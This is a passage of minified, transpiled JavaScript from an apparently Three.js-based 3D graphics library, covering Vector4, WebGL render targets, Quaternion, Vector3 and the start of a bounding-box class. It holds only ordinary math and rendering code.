A=(o+1)/2,m=(u+1)/2,v=(f+1)/2,g=(s+c)/4,y=(l+p)/4,b=(d+h)/4;return m<A&&v<A?i=A<.01?(n=0,r=.707106781):(r=g/(n=Math.sqrt(A)),y/n):v<m?i=m<.01?(r=0,n=.707106781):(n=g/(r=Math.sqrt(m)),b/r):v<.01?(r=n=.707106781,i=0):(n=y/(i=Math.sqrt(v)),r=b/i),this.set(n,r,i,t),this}var _=Math.sqrt((h-d)*(h-d)+(l-p)*(l-p)+(c-s)*(c-s));return Math.abs(_)<.001&&(_=1),this.x=(h-d)/_,this.y=(l-p)/_,this.z=(c-s)/_,this.w=Math.acos((o+u+f-1)/2),this}},{key:"min",value:function(e){return this.x=Math.min(this.x,e.x),this.y=Math.min(this.y,e.y),this.z=Math.min(this.z,e.z),this.w=Math.min(this.w,e.w),this}},{key:"max",value:function(e){return this.x=Math.max(this.x,e.x),this.y=Math.max(this.y,e.y),this.z=Math.max(this.z,e.z),this.w=Math.max(this.w,e.w),this}},{key:"clamp",value:function(e,t){return this.x=Math.max(e.x,Math.min(t.x,this.x)),this.y=Math.max(e.y,Math.min(t.y,this.y)),this.z=Math.max(e.z,Math.min(t.z,this.z)),this.w=Math.max(e.w,Math.min(t.w,this.w)),this}},{key:"clampScalar",value:function(e,t){return this.x=Math.max(e,Math.min(t,this.x)),this.y=Math.max(e,Math.min(t,this.y)),this.z=Math.max(e,Math.min(t,this.z)),this.w=Math.max(e,Math.min(t,this.w)),this}},{key:"clampLength",value:function(e,t){var n=this.length();return this.divideScalar(n||1).multiplyScalar(Math.max(e,Math.min(t,n)))}},{key:"floor",value:function(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this.z=Math.floor(this.z),this.w=Math.floor(this.w),this}},{key:"ceil",value:function(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this.z=Math.ceil(this.z),this.w=Math.ceil(this.w),this}},{key:"round",value:function(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this.z=Math.round(this.z),this.w=Math.round(this.w),this}},{key:"roundToZero",value:function(){return this.x=this.x<0?Math.ceil(this.x):Math.floor(this.x),this.y=this.y<0?Math.ceil(this.y):Math.floor(this.y),this.z=this.z<0?Math.ceil(this.z):Math.floor(this.z),this.w=this.w<0?Math.ceil(this.w):Math.floor(this.w),this}},{key:"negate",value:function(){return this.x=-this.x,this.y=-this.y,this.z=-this.z,this.w=-this.w,this}},{key:"dot",value:function(e){return this.x*e.x+this.y*e.y+this.z*e.z+this.w*e.w}},{key:"lengthSq",value:function(){return this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w}},{key:"length",value:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w)}},{key:"manhattanLength",value:function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)+Math.abs(this.w)}},{key:"normalize",value:function(){return this.divideScalar(this.length()||1)}},{key:"setLength",value:function(e){return this.normalize().multiplyScalar(e)}},{key:"lerp",value:function(e,t){return this.x+=(e.x-this.x)*t,this.y+=(e.y-this.y)*t,this.z+=(e.z-this.z)*t,this.w+=(e.w-this.w)*t,this}},{key:"lerpVectors",value:function(e,t,n){return this.x=e.x+(t.x-e.x)*n,this.y=e.y+(t.y-e.y)*n,this.z=e.z+(t.z-e.z)*n,this.w=e.w+(t.w-e.w)*n,this}},{key:"equals",value:function(e){return e.x===this.x&&e.y===this.y&&e.z===this.z&&e.w===this.w}},{key:"fromArray",value:function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0;return this.x=e[t],this.y=e[t+1],this.z=e[t+2],this.w=e[t+3],this}},{key:"toArray",value:function(){var e=0<arguments.length&&void 0!==arguments[0]?arguments[0]:[],t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0;return e[t]=this.x,e[t+1]=this.y,e[t+2]=this.z,e[t+3]=this.w,e}},{key:"fromBufferAttribute",value:function(e,t,n){return this.x=e.getX(t),this.y=e.getY(t),this.z=e.getZ(t),this.w=e.getW(t),this}},{key:"random",value:function(){return this.x=Math.random(),this.y=Math.random(),this.z=Math.random(),this.w=Math.random(),this}},{key:Symbol.iterator,value:regeneratorRuntime.mark((function e(){return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.next=2,this.x;case 2:return e.next=4,this.y;case 4:return e.next=6,this.z;case 6:return e.next=8,this.w;case 8:case"end":return e.stop()}}),e,this)}))},{key:"width",get:function(){return this.z},set:function(e){this.z=e}},{key:"height",get:function(){return this.w},set:function(e){this.w=e}}]),e}();fe.prototype.isVector4=!0;var Ae=function(e){_inherits2(n,H);var t=_createSuper(n);function n(e,r){var i,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:{};return _classCallCheck2(this,n),(i=t.call(this)).width=e,i.height=r,i.depth=1,i.scissor=new fe(0,0,e,r),i.scissorTest=!1,i.viewport=new fe(0,0,e,r),i.texture=new pe(void 0,a.mapping,a.wrapS,a.wrapT,a.magFilter,a.minFilter,a.format,a.type,a.anisotropy,a.encoding),i.texture.isRenderTargetTexture=!0,i.texture.image={width:e,height:r,depth:1},i.texture.generateMipmaps=void 0!==a.generateMipmaps&&a.generateMipmaps,i.texture.internalFormat=void 0!==a.internalFormat?a.internalFormat:null,i.texture.minFilter=void 0!==a.minFilter?a.minFilter:A,i.depthBuffer=void 0===a.depthBuffer||a.depthBuffer,i.stencilBuffer=void 0!==a.stencilBuffer&&a.stencilBuffer,i.depthTexture=void 0!==a.depthTexture?a.depthTexture:null,i}return _createClass2(n,[{key:"setTexture",value:function(e){e.image={width:this.width,height:this.height,depth:this.depth},this.texture=e}},{key:"setSize",value:function(e,t){var n=2<arguments.length&&void 0!==arguments[2]?arguments[2]:1;this.width===e&&this.height===t&&this.depth===n||(this.width=e,this.height=t,this.depth=n,this.texture.image.width=e,this.texture.image.height=t,this.texture.image.depth=n,this.dispose()),this.viewport.set(0,0,e,t),this.scissor.set(0,0,e,t)}},{key:"clone",value:function(){return(new this.constructor).copy(this)}},{key:"copy",value:function(e){return this.width=e.width,this.height=e.height,this.depth=e.depth,this.viewport.copy(e.viewport),this.texture=e.texture.clone(),this.texture.image=_objectSpread({},this.texture.image),this.depthBuffer=e.depthBuffer,this.stencilBuffer=e.stencilBuffer,this.depthTexture=e.depthTexture,this}},{key:"dispose",value:function(){this.dispatchEvent({type:"dispose"})}}]),n}();Ae.prototype.isWebGLRenderTarget=!0;var me=function(e){_inherits2(n,Ae);var t=_createSuper(n);function n(e,r,i){var a;_classCallCheck2(this,n);var o=(a=t.call(this,e,r)).texture;a.texture=[];for(var s=0;s<i;s++)a.texture[s]=o.clone();return a}return _createClass2(n,[{key:"setSize",value:function(e,t){var n=2<arguments.length&&void 0!==arguments[2]?arguments[2]:1;if(this.width!==e||this.height!==t||this.depth!==n){this.width=e,this.height=t,this.depth=n;for(var r=0,i=this.texture.length;r<i;r++)this.texture[r].image.width=e,this.texture[r].image.height=t,this.texture[r].image.depth=n;this.dispose()}return this.viewport.set(0,0,e,t),this.scissor.set(0,0,e,t),this}},{key:"copy",value:function(e){this.dispose(),this.width=e.width,this.height=e.height,this.depth=e.depth,this.viewport.set(0,0,this.width,this.height),this.scissor.set(0,0,this.width,this.height),this.depthBuffer=e.depthBuffer,this.stencilBuffer=e.stencilBuffer,this.depthTexture=e.depthTexture;for(var t=this.texture.length=0,n=e.texture.length;t<n;t++)this.texture[t]=e.texture[t].clone();return this}}]),n}();me.prototype.isWebGLMultipleRenderTargets=!0;var ve=function(e){_inherits2(n,Ae);var t=_createSuper(n);function n(e,r){var i,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:{};return _classCallCheck2(this,n),(i=t.call(this,e,r,a)).samples=4,i.ignoreDepthForMultisampleCopy=void 0===a.ignoreDepth||a.ignoreDepth,i.useRenderToTexture=void 0!==a.useRenderToTexture&&a.useRenderToTexture,i.useRenderbuffer=!1===i.useRenderToTexture,i}return _createClass2(n,[{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.samples=e.samples,this.useRenderToTexture=e.useRenderToTexture,this.useRenderbuffer=e.useRenderbuffer,this}}]),n}();ve.prototype.isWebGLMultisampleRenderTarget=!0;var ge=function(){function e(){var t=0<arguments.length&&void 0!==arguments[0]?arguments[0]:0,n=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0,r=2<arguments.length&&void 0!==arguments[2]?arguments[2]:0,i=3<arguments.length&&void 0!==arguments[3]?arguments[3]:1;_classCallCheck2(this,e),this._x=t,this._y=n,this._z=r,this._w=i}return _createClass2(e,[{key:"set",value:function(e,t,n,r){return this._x=e,this._y=t,this._z=n,this._w=r,this._onChangeCallback(),this}},{key:"clone",value:function(){return new this.constructor(this._x,this._y,this._z,this._w)}},{key:"copy",value:function(e){return this._x=e.x,this._y=e.y,this._z=e.z,this._w=e.w,this._onChangeCallback(),this}},{key:"setFromEuler",value:function(e,t){if(!e||!e.isEuler)throw new Error("THREE.Quaternion: .setFromEuler() now expects an Euler rotation rather than a Vector3 and order.");var n=e._x,r=e._y,i=e._z,a=e._order,o=Math.cos,s=Math.sin,l=o(n/2),c=o(r/2),u=o(i/2),d=s(n/2),p=s(r/2),h=s(i/2);switch(a){case"XYZ":this._x=d*c*u+l*p*h,this._y=l*p*u-d*c*h,this._z=l*c*h+d*p*u,this._w=l*c*u-d*p*h;break;case"YXZ":this._x=d*c*u+l*p*h,this._y=l*p*u-d*c*h,this._z=l*c*h-d*p*u,this._w=l*c*u+d*p*h;break;case"ZXY":this._x=d*c*u-l*p*h,this._y=l*p*u+d*c*h,this._z=l*c*h+d*p*u,this._w=l*c*u-d*p*h;break;case"ZYX":this._x=d*c*u-l*p*h,this._y=l*p*u+d*c*h,this._z=l*c*h-d*p*u,this._w=l*c*u+d*p*h;break;case"YZX":this._x=d*c*u+l*p*h,this._y=l*p*u+d*c*h,this._z=l*c*h-d*p*u,this._w=l*c*u-d*p*h;break;case"XZY":this._x=d*c*u-l*p*h,this._y=l*p*u-d*c*h,this._z=l*c*h+d*p*u,this._w=l*c*u+d*p*h}return!1!==t&&this._onChangeCallback(),this}},{key:"setFromAxisAngle",value:function(e,t){var n=t/2,r=Math.sin(n);return this._x=e.x*r,this._y=e.y*r,this._z=e.z*r,this._w=Math.cos(n),this._onChangeCallback(),this}},{key:"setFromRotationMatrix",value:function(e){var t=e.elements,n=t[0],r=t[4],i=t[8],a=t[1],o=t[5],s=t[9],l=t[2],c=t[6],u=t[10],d=n+o+u;if(0<d){var p=.5/Math.sqrt(d+1);this._w=.25/p,this._x=(c-s)*p,this._y=(i-l)*p,this._z=(a-r)*p}else if(o<n&&u<n){var h=2*Math.sqrt(1+n-o-u);this._w=(c-s)/h,this._x=.25*h,this._y=(r+a)/h,this._z=(i+l)/h}else if(u<o){var f=2*Math.sqrt(1+o-n-u);this._w=(i-l)/f,this._x=(r+a)/f,this._y=.25*f,this._z=(s+c)/f}else{var A=2*Math.sqrt(1+u-n-o);this._w=(a-r)/A,this._x=(i+l)/A,this._y=(s+c)/A,this._z=.25*A}return this._onChangeCallback(),this}},{key:"setFromUnitVectors",value:function(e,t){var n=e.dot(t)+1;return n<Number.EPSILON?(n=0,Math.abs(e.x)>Math.abs(e.z)?(this._x=-e.y,this._y=e.x,this._z=0):(this._x=0,this._y=-e.z,this._z=e.y)):(this._x=e.y*t.z-e.z*t.y,this._y=e.z*t.x-e.x*t.z,this._z=e.x*t.y-e.y*t.x),this._w=n,this.normalize()}},{key:"angleTo",value:function(e){return 2*Math.acos(Math.abs(X(this.dot(e),-1,1)))}},{key:"rotateTowards",value:function(e,t){var n=this.angleTo(e);if(0===n)return this;var r=Math.min(1,t/n);return this.slerp(e,r),this}},{key:"identity",value:function(){return this.set(0,0,0,1)}},{key:"invert",value:function(){return this.conjugate()}},{key:"conjugate",value:function(){return this._x*=-1,this._y*=-1,this._z*=-1,this._onChangeCallback(),this}},{key:"dot",value:function(e){return this._x*e._x+this._y*e._y+this._z*e._z+this._w*e._w}},{key:"lengthSq",value:function(){return this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w}},{key:"length",value:function(){return Math.sqrt(this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w)}},{key:"normalize",value:function(){var e=this.length();return this._w=0===e?(this._x=0,this._y=0,this._z=0,1):(e=1/e,this._x=this._x*e,this._y=this._y*e,this._z=this._z*e,this._w*e),this._onChangeCallback(),this}},{key:"multiply",value:function(e,t){return void 0!==t?this.multiplyQuaternions(e,t):this.multiplyQuaternions(this,e)}},{key:"premultiply",value:function(e){return this.multiplyQuaternions(e,this)}},{key:"multiplyQuaternions",value:function(e,t){var n=e._x,r=e._y,i=e._z,a=e._w,o=t._x,s=t._y,l=t._z,c=t._w;return this._x=n*c+a*o+r*l-i*s,this._y=r*c+a*s+i*o-n*l,this._z=i*c+a*l+n*s-r*o,this._w=a*c-n*o-r*s-i*l,this._onChangeCallback(),this}},{key:"slerp",value:function(e,t){if(0===t)return this;if(1===t)return this.copy(e);var n=this._x,r=this._y,i=this._z,a=this._w,o=a*e._w+n*e._x+r*e._y+i*e._z;if(o<0?(this._w=-e._w,this._x=-e._x,this._y=-e._y,this._z=-e._z,o=-o):this.copy(e),1<=o)return this._w=a,this._x=n,this._y=r,this._z=i,this;var s=1-o*o;if(s<=Number.EPSILON){var l=1-t;return this._w=l*a+t*this._w,this._x=l*n+t*this._x,this._y=l*r+t*this._y,this._z=l*i+t*this._z,this.normalize(),this._onChangeCallback(),this}var c=Math.sqrt(s),u=Math.atan2(c,o),d=Math.sin((1-t)*u)/c,p=Math.sin(t*u)/c;return this._w=a*d+this._w*p,this._x=n*d+this._x*p,this._y=r*d+this._y*p,this._z=i*d+this._z*p,this._onChangeCallback(),this}},{key:"slerpQuaternions",value:function(e,t,n){this.copy(e).slerp(t,n)}},{key:"random",value:function(){var e=Math.random(),t=Math.sqrt(1-e),n=Math.sqrt(e),r=2*Math.PI*Math.random(),i=2*Math.PI*Math.random();return this.set(t*Math.cos(r),n*Math.sin(i),n*Math.cos(i),t*Math.sin(r))}},{key:"equals",value:function(e){return e._x===this._x&&e._y===this._y&&e._z===this._z&&e._w===this._w}},{key:"fromArray",value:function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0;return this._x=e[t],this._y=e[t+1],this._z=e[t+2],this._w=e[t+3],this._onChangeCallback(),this}},{key:"toArray",value:function(){var e=0<arguments.length&&void 0!==arguments[0]?arguments[0]:[],t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0;return e[t]=this._x,e[t+1]=this._y,e[t+2]=this._z,e[t+3]=this._w,e}},{key:"fromBufferAttribute",value:function(e,t){return this._x=e.getX(t),this._y=e.getY(t),this._z=e.getZ(t),this._w=e.getW(t),this}},{key:"_onChange",value:function(e){return this._onChangeCallback=e,this}},{key:"_onChangeCallback",value:function(){}},{key:"x",get:function(){return this._x},set:function(e){this._x=e,this._onChangeCallback()}},{key:"y",get:function(){return this._y},set:function(e){this._y=e,this._onChangeCallback()}},{key:"z",get:function(){return this._z},set:function(e){this._z=e,this._onChangeCallback()}},{key:"w",get:function(){return this._w},set:function(e){this._w=e,this._onChangeCallback()}}],[{key:"slerp",value:function(e,t,n,r){return n.slerpQuaternions(e,t,r)}},{key:"slerpFlat",value:function(e,t,n,r,i,a,o){var s=n[r+0],l=n[r+1],c=n[r+2],u=n[r+3],d=i[a+0],p=i[a+1],h=i[a+2],f=i[a+3];if(0===o)return e[t+0]=s,e[t+1]=l,e[t+2]=c,void(e[t+3]=u);if(1===o)return e[t+0]=d,e[t+1]=p,e[t+2]=h,void(e[t+3]=f);if(u!==f||s!==d||l!==p||c!==h){var A=1-o,m=s*d+l*p+c*h+u*f,v=0<=m?1:-1,g=1-m*m;if(g>Number.EPSILON){var y=Math.sqrt(g),b=Math.atan2(y,m*v);A=Math.sin(A*b)/y,o=Math.sin(o*b)/y}var _=o*v;if(s=s*A+d*_,l=l*A+p*_,c=c*A+h*_,u=u*A+f*_,A===1-o){var w=1/Math.sqrt(s*s+l*l+c*c+u*u);s*=w,l*=w,c*=w,u*=w}}e[t]=s,e[t+1]=l,e[t+2]=c,e[t+3]=u}},{key:"multiplyQuaternionsFlat",value:function(e,t,n,r,i,a){var o=n[r],s=n[r+1],l=n[r+2],c=n[r+3],u=i[a],d=i[a+1],p=i[a+2],h=i[a+3];return e[t]=o*h+c*u+s*p-l*d,e[t+1]=s*h+c*d+l*u-o*p,e[t+2]=l*h+c*p+o*d-s*u,e[t+3]=c*h-o*u-s*d-l*p,e}}]),e}();ge.prototype.isQuaternion=!0;var ye=function(){function e(){var t=0<arguments.length&&void 0!==arguments[0]?arguments[0]:0,n=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0,r=2<arguments.length&&void 0!==arguments[2]?arguments[2]:0;_classCallCheck2(this,e),this.x=t,this.y=n,this.z=r}return _createClass2(e,[{key:"set",value:function(e,t,n){return void 0===n&&(n=this.z),this.x=e,this.y=t,this.z=n,this}},{key:"setScalar",value:function(e){return this.x=e,this.y=e,this.z=e,this}},{key:"setX",value:function(e){return this.x=e,this}},{key:"setY",value:function(e){return this.y=e,this}},{key:"setZ",value:function(e){return this.z=e,this}},{key:"setComponent",value:function(e,t){switch(e){case 0:this.x=t;break;case 1:this.y=t;break;case 2:this.z=t;break;default:throw new Error("index is out of range: "+e)}return this}},{key:"getComponent",value:function(e){switch(e){case 0:return this.x;case 1:return this.y;case 2:return this.z;default:throw new Error("index is out of range: "+e)}}},{key:"clone",value:function(){return new this.constructor(this.x,this.y,this.z)}},{key:"copy",value:function(e){return this.x=e.x,this.y=e.y,this.z=e.z,this}},{key:"add",value:function(e,t){return void 0!==t?this.addVectors(e,t):(this.x+=e.x,this.y+=e.y,this.z+=e.z,this)}},{key:"addScalar",value:function(e){return this.x+=e,this.y+=e,this.z+=e,this}},{key:"addVectors",value:function(e,t){return this.x=e.x+t.x,this.y=e.y+t.y,this.z=e.z+t.z,this}},{key:"addScaledVector",value:function(e,t){return this.x+=e.x*t,this.y+=e.y*t,this.z+=e.z*t,this}},{key:"sub",value:function(e,t){return void 0!==t?this.subVectors(e,t):(this.x-=e.x,this.y-=e.y,this.z-=e.z,this)}},{key:"subScalar",value:function(e){return this.x-=e,this.y-=e,this.z-=e,this}},{key:"subVectors",value:function(e,t){return this.x=e.x-t.x,this.y=e.y-t.y,this.z=e.z-t.z,this}},{key:"multiply",value:function(e,t){return void 0!==t?this.multiplyVectors(e,t):(this.x*=e.x,this.y*=e.y,this.z*=e.z,this)}},{key:"multiplyScalar",value:function(e){return this.x*=e,this.y*=e,this.z*=e,this}},{key:"multiplyVectors",value:function(e,t){return this.x=e.x*t.x,this.y=e.y*t.y,this.z=e.z*t.z,this}},{key:"applyEuler",value:function(e){return!e||e.isEuler,this.applyQuaternion(_e.setFromEuler(e))}},{key:"applyAxisAngle",value:function(e,t){return this.applyQuaternion(_e.setFromAxisAngle(e,t))}},{key:"applyMatrix3",value:function(e){var t=this.x,n=this.y,r=this.z,i=e.elements;return this.x=i[0]*t+i[3]*n+i[6]*r,this.y=i[1]*t+i[4]*n+i[7]*r,this.z=i[2]*t+i[5]*n+i[8]*r,this}},{key:"applyNormalMatrix",value:function(e){return this.applyMatrix3(e).normalize()}},{key:"applyMatrix4",value:function(e){var t=this.x,n=this.y,r=this.z,i=e.elements,a=1/(i[3]*t+i[7]*n+i[11]*r+i[15]);return this.x=(i[0]*t+i[4]*n+i[8]*r+i[12])*a,this.y=(i[1]*t+i[5]*n+i[9]*r+i[13])*a,this.z=(i[2]*t+i[6]*n+i[10]*r+i[14])*a,this}},{key:"applyQuaternion",value:function(e){var t=this.x,n=this.y,r=this.z,i=e.x,a=e.y,o=e.z,s=e.w,l=s*t+a*r-o*n,c=s*n+o*t-i*r,u=s*r+i*n-a*t,d=-i*t-a*n-o*r;return this.x=l*s+d*-i+c*-o-u*-a,this.y=c*s+d*-a+u*-i-l*-o,this.z=u*s+d*-o+l*-a-c*-i,this}},{key:"project",value:function(e){return this.applyMatrix4(e.matrixWorldInverse).applyMatrix4(e.projectionMatrix)}},{key:"unproject",value:function(e){return this.applyMatrix4(e.projectionMatrixInverse).applyMatrix4(e.matrixWorld)}},{key:"transformDirection",value:function(e){var t=this.x,n=this.y,r=this.z,i=e.elements;return this.x=i[0]*t+i[4]*n+i[8]*r,this.y=i[1]*t+i[5]*n+i[9]*r,this.z=i[2]*t+i[6]*n+i[10]*r,this.normalize()}},{key:"divide",value:function(e){return this.x/=e.x,this.y/=e.y,this.z/=e.z,this}},{key:"divideScalar",value:function(e){return this.multiplyScalar(1/e)}},{key:"min",value:function(e){return this.x=Math.min(this.x,e.x),this.y=Math.min(this.y,e.y),this.z=Math.min(this.z,e.z),this}},{key:"max",value:function(e){return this.x=Math.max(this.x,e.x),this.y=Math.max(this.y,e.y),this.z=Math.max(this.z,e.z),this}},{key:"clamp",value:function(e,t){return this.x=Math.max(e.x,Math.min(t.x,this.x)),this.y=Math.max(e.y,Math.min(t.y,this.y)),this.z=Math.max(e.z,Math.min(t.z,this.z)),this}},{key:"clampScalar",value:function(e,t){return this.x=Math.max(e,Math.min(t,this.x)),this.y=Math.max(e,Math.min(t,this.y)),this.z=Math.max(e,Math.min(t,this.z)),this}},{key:"clampLength",value:function(e,t){var n=this.length();return this.divideScalar(n||1).multiplyScalar(Math.max(e,Math.min(t,n)))}},{key:"floor",value:function(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this.z=Math.floor(this.z),this}},{key:"ceil",value:function(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this.z=Math.ceil(this.z),this}},{key:"round",value:function(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this.z=Math.round(this.z),this}},{key:"roundToZero",value:function(){return this.x=this.x<0?Math.ceil(this.x):Math.floor(this.x),this.y=this.y<0?Math.ceil(this.y):Math.floor(this.y),this.z=this.z<0?Math.ceil(this.z):Math.floor(this.z),this}},{key:"negate",value:function(){return this.x=-this.x,this.y=-this.y,this.z=-this.z,this}},{key:"dot",value:function(e){return this.x*e.x+this.y*e.y+this.z*e.z}},{key:"lengthSq",value:function(){return this.x*this.x+this.y*this.y+this.z*this.z}},{key:"length",value:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z)}},{key:"manhattanLength",value:function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)}},{key:"normalize",value:function(){return this.divideScalar(this.length()||1)}},{key:"setLength",value:function(e){return this.normalize().multiplyScalar(e)}},{key:"lerp",value:function(e,t){return this.x+=(e.x-this.x)*t,this.y+=(e.y-this.y)*t,this.z+=(e.z-this.z)*t,this}},{key:"lerpVectors",value:function(e,t,n){return this.x=e.x+(t.x-e.x)*n,this.y=e.y+(t.y-e.y)*n,this.z=e.z+(t.z-e.z)*n,this}},{key:"cross",value:function(e,t){return void 0!==t?this.crossVectors(e,t):this.crossVectors(this,e)}},{key:"crossVectors",value:function(e,t){var n=e.x,r=e.y,i=e.z,a=t.x,o=t.y,s=t.z;return this.x=r*s-i*o,this.y=i*a-n*s,this.z=n*o-r*a,this}},{key:"projectOnVector",value:function(e){var t=e.lengthSq();if(0===t)return this.set(0,0,0);var n=e.dot(this)/t;return this.copy(e).multiplyScalar(n)}},{key:"projectOnPlane",value:function(e){return be.copy(this).projectOnVector(e),this.sub(be)}},{key:"reflect",value:function(e){return this.sub(be.copy(e).multiplyScalar(2*this.dot(e)))}},{key:"angleTo",value:function(e){var t=Math.sqrt(this.lengthSq()*e.lengthSq());if(0===t)return Math.PI/2;var n=this.dot(e)/t;return Math.acos(X(n,-1,1))}},{key:"distanceTo",value:function(e){return Math.sqrt(this.distanceToSquared(e))}},{key:"distanceToSquared",value:function(e){var t=this.x-e.x,n=this.y-e.y,r=this.z-e.z;return t*t+n*n+r*r}},{key:"manhattanDistanceTo",value:function(e){return Math.abs(this.x-e.x)+Math.abs(this.y-e.y)+Math.abs(this.z-e.z)}},{key:"setFromSpherical",value:function(e){return this.setFromSphericalCoords(e.radius,e.phi,e.theta)}},{key:"setFromSphericalCoords",value:function(e,t,n){var r=Math.sin(t)*e;return this.x=r*Math.sin(n),this.y=Math.cos(t)*e,this.z=r*Math.cos(n),this}},{key:"setFromCylindrical",value:function(e){return this.setFromCylindricalCoords(e.radius,e.theta,e.y)}},{key:"setFromCylindricalCoords",value:function(e,t,n){return this.x=e*Math.sin(t),this.y=n,this.z=e*Math.cos(t),this}},{key:"setFromMatrixPosition",value:function(e){var t=e.elements;return this.x=t[12],this.y=t[13],this.z=t[14],this}},{key:"setFromMatrixScale",value:function(e){var t=this.setFromMatrixColumn(e,0).length(),n=this.setFromMatrixColumn(e,1).length(),r=this.setFromMatrixColumn(e,2).length();return this.x=t,this.y=n,this.z=r,this}},{key:"setFromMatrixColumn",value:function(e,t){return this.fromArray(e.elements,4*t)}},{key:"setFromMatrix3Column",value:function(e,t){return this.fromArray(e.elements,3*t)}},{key:"equals",value:function(e){return e.x===this.x&&e.y===this.y&&e.z===this.z}},{key:"fromArray",value:function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0;return this.x=e[t],this.y=e[t+1],this.z=e[t+2],this}},{key:"toArray",value:function(){var e=0<arguments.length&&void 0!==arguments[0]?arguments[0]:[],t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0;return e[t]=this.x,e[t+1]=this.y,e[t+2]=this.z,e}},{key:"fromBufferAttribute",value:function(e,t,n){return this.x=e.getX(t),this.y=e.getY(t),this.z=e.getZ(t),this}},{key:"random",value:function(){return this.x=Math.random(),this.y=Math.random(),this.z=Math.random(),this}},{key:"randomDirection",value:function(){var e=2*(Math.random()-.5),t=Math.random()*Math.PI*2,n=Math.sqrt(1-Math.pow(e,2));return this.x=n*Math.cos(t),this.y=n*Math.sin(t),this.z=e,this}},{key:Symbol.iterator,value:regeneratorRuntime.mark((function e(){return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.next=2,this.x;case 2:return e.next=4,this.y;case 4:return e.next=6,this.z;case 6:case"end":return e.stop()}}),e,this)}))}]),e}();ye.prototype.isVector3=!0;var be=new ye,_e=new ge,we=function(){function e(){var t=0<arguments.length&&void 0!==arguments[0]?arguments[0]:new ye(1/0,1/0,1/0),n=1<arguments.length&&void 0!==arguments[1]?arguments[1]:new ye(-1/0,-1/0,-1/0);_classCallCheck2(this,e),this.min=t,this.max=n}return _createClass2(e,[{key:"set",value:function(e,t){return this.min.copy(e),this.max.copy(t),this}},{key:"setFromArray",value:function(e){for(var t=1/0,n=1/0,r=1/0,i=-1/0,a=-1/0,o=-1/0,s=0,l=e.length;s<l;s+=3){var c=e[s],u=e[s+1],d=e[s+2];c<t&&(t=c),u<n&&(n=u),d<r&&(r=d),i<c&&(i=c),a<u&&(a=u),o<d&&(o=d)}return this.min.set(t,n,r),this.max.set(i,a,o),this}},{key:"setFromBufferAttribute",value:function(e){for(var t=1/0,n=1/0,r=1/0,i=-1/0,a=-1/0,o=-1/0,s=0,l=e.count;s<l;s++){var c=e.getX(s),u=e.getY(s),d=e.getZ(s);c<t&&(t=c),u<n&&(n=u),d<r&&(r=d),i<c&&(i=c),a<u&&(a=u),o<d&&(o=d)}return this.min.set(t,n,r),this.max.set(i,a,o),this}},{key:"setFromPoints",value:function(e){this.makeEmpty();for(var t=0,n=e.length;t<n;t++)this.expandByPoint(e[t]);return this}},{key:"setFromCenterAndSize",value:function(e,t){var n=xe.copy(t).multiplyScalar(.5);return this.min.copy(e).sub(n),this.max.copy(e).add(n),this}},{key:"setFromObject",value:function(e){return this.makeEmpty(),this.expandByObject(e)}},{key:"clone",value:function(){return(new this.constructor).copy(this)}},{key:"copy",value:function(e){return this.min.copy(e.min),this.max.copy(e.max),this}},{key:"makeEmpty",value:function(){return this.min.x=this.min.y=this.min.z=1/0,this.max.x=this.max.y=this.max.z=-1/0,this}},{key:"isEmpty",value:function(){return this.max.x<this.min.x||this.max.y<this.min.y||this.max.z<this.min.z}},{key:"getCenter",value:function(e){return this.isEmpty()?e.set(0,0,0):e.addVectors(this.min,this.max).multiplyScalar(.5)}},{key:"getSize",value:function(e){return this.isEmpty()?e.set(0,0,0):e.subVectors(this.max,this.min)}},{key:"expandByPoint",value:function(e){return this.min.min(e),this.max.max(e),this}},{key:"expandByVector",value:function(e){return this.min.sub(e),this.max.add(e),this}},{key:"expandByScalar",value:function(e){return this.min.addScalar(-e),this.max.addScalar(e),this}},{key:"expandByObject",value:function(e){e.updateWorldMatrix(!1,!1);var t=e.geometry;void 0!==t&&(null===t.boundingBox&&t.computeBoundingBox(),Se.copy(t.boundingBox),Se.applyMatrix4(e.matrixWorld),this.union(Se));for(var n=e.children,r=0,i=n.length;r<i;r++)this.expandByObject(n[r]);return this}},{key:"containsPoint",value:function(e){return!(e.x<this.min.x||e.x>this.max.x||e.y<this.min.y||e.y>this.max.y||e.z<this.min.z||e.z>this.max.z)}},{key:"containsBox",value:function(e){return this.min.x<=e.min.x&&e.max.x<=this.max.x&&this.min.y<=e.min.y&&e.max.y<=this.max.y&&this.min.z<=e.min.z&&e.max.z<=this.max.z}},{key:"getParameter",value:function(e,t){return t.set((e.x-this.min.x)/(this.max.x-this.min.x),(e.y-this.min.y)/(this.max.y-this.min.y),(e.z-this.min.z)/(this.max.z-this.min.z))}},{key:"intersectsBox",value:function(e){return!(e.max.x<this.min.x||e.min.x>this.max.x||e.max.y<this.min.y||e.min.y>this.max.y||e.max.z<this.min.z||e.min.z>this.max.z)}},{key:"intersectsSphere",value:function(e){return 